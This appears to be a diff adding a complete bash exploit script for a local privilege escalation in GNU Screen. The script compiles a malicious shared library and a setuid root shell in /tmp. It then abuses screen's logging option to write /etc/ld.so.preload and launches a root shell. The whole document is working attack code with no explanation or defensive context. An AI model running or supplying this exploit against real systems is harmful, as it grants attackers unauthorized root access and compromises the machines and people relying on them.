@@ -1,0 +1,34 @@
+#!/bin/bash
+echo "~ gnu/screenroot ~"
+cat << 'EOT' > /tmp/libhax.c
+#include <stdio.h>
+#include <sys/types.h>
+#include <unistd.h>
+#include <sys/stat.h>
+__attribute__ ((__constructor__))
+void dropshell(void){
+    chown("/tmp/rootshell", 0, 0);
+    chmod("/tmp/rootshell", 04755);
+    unlink("/etc/ld.so.preload");
+    printf("[+] done!\n");
+}
+EOT
+gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
+rm -f /tmp/libhax.c
+cat << 'EOT' > /tmp/rootshell.c
+#include <stdio.h>
+int main(void){
+    setuid(0);
+    setgid(0);
+    execvp("/bin/sh", NULL);
+}
+EOT
+gcc -o /tmp/rootshell /tmp/rootshell.c -Wno-implicit-function-declaration
+rm -f /tmp/rootshell.c
+echo "[+] Creating /etc/ld.so.preload..."
+cd /etc
+umask 000
+screen -D -m -L ld.so.preload echo -ne "\x0a/tmp/libhax.so"
+echo "[+] Triggering..."
+screen -ls
+/tmp/rootshell
